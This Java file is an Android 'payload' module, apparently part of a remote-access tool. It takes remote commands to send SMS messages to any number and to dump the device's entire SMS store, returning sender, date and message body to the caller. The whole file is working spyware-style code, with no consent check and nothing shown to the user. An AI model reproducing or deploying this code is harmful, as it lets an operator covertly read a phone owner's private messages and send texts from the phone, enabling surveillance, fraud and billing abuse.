package com.core.payloads;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import com.corelib.IPayload;
import com.corelib.Packet;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;

/**
 * Sms class
 * Created by hkff on 4/21/15.
 */
public class Sms implements IPayload {


    //-----------------------------------------------------------//
    public enum Commands {
        SENDSMS,
        GETSMS,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp = new String(msg.getContent()).split(":");

        // We handle the command
        switch (cmd){
            // Send SMS command
            // The protocol is : SENDSMS:phone_num:message
            case SENDSMS :
                // We get the arguments
                String num = (tmp.length > 0)? tmp[0] : "";
                String txt = (tmp.length > 1)? tmp[1] : "";

                if(!num.isEmpty()){
                    // We send our sms
                    this.sendSMS(num, txt);

                    // We set the result
                    result.setMsg("SMS Sended !");
                }else{
                    // No num provided
                    result.setMsg("No phone number provided !");
                }
                break;

            // Get SMS
            // Protocol : GETSMS
            case GETSMS:
                System.out.println(this.getSMS());
                result.setMsg("SMS List : ");
                result.setContent(this.getSMS().getBytes());
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//

    /**
     * SMS Packet class
     */
    class PacketSMS {

        private int id;
        private int thread_id;
        private String address;
        private int person;
        private long date;
        private int read;
        private int type;
        private String body;

        public PacketSMS() {}

        public PacketSMS(int id, int thid, String ad, int pers, long dat, int read, String body, int type) {
            this.id = id;
            this.thread_id = thid;
            this.address = ad;
            this.person = pers;
            this.date = dat;
            this.read = read;
            this.body = body;
            this.type = type;
        }

        public String toString() {
            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            return "" +
            " - Id : " + this.id +
            //" " + this.thread_id +
            " - Phone : " + this.address +
            //" Person : " + this.person +
            " - Date :  " + df.format(this.date) +
            " - Seen : " + this.read +
            " - Content : " + this.body;
            //" " + this.type;
        }
    }


    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Sms(){}

    /**
     * Constructor
     * @param app
     */
    public Sms(Activity app){
        this.app = app;
    }


    /**
     * Send an SMS
     */
    public String sendSMS(String num, String msg) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(num, null, msg, null, null);
        return "SMS_SENDED";
    }


    /**
     * Get all SMS
     */
    public String getSMS() {
        String result = "";

        ArrayList<PacketSMS> l = new ArrayList<>();
        String WHERE_CONDITION = "";
        String SORT_ORDER = "date DESC";
        String[] column = { "_id", "thread_id", "address", "person", "date","read" ,"body", "type" };
        String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent

        Cursor cursor = app.getContentResolver().query(Uri.parse(CONTENT_URI), column , WHERE_CONDITION, null, SORT_ORDER);
        if(cursor.getCount() != 0) {
            cursor.moveToFirst();

            do{
                if(cursor.getColumnCount() != 0) {
                    int id = cursor.getInt(cursor.getColumnIndex("_id"));
                    int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
                    String add = cursor.getString(cursor.getColumnIndex("address"));
                    int person = cursor.getInt(cursor.getColumnIndex("person"));
                    long date  = cursor.getLong(cursor.getColumnIndex("date"));
                    int read = cursor.getInt(cursor.getColumnIndex("read"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    int type = cursor.getInt(cursor.getColumnIndex("type"));
                    l.add(new PacketSMS(id, thid, add, person, date, read, body, type));
                }
            } while(cursor.moveToNext());
        }
        cursor.close();

        // Convert the list to string
        for(PacketSMS sms : l){
            result += "\n" + sms.toString();
        }

        return result;
    }
}
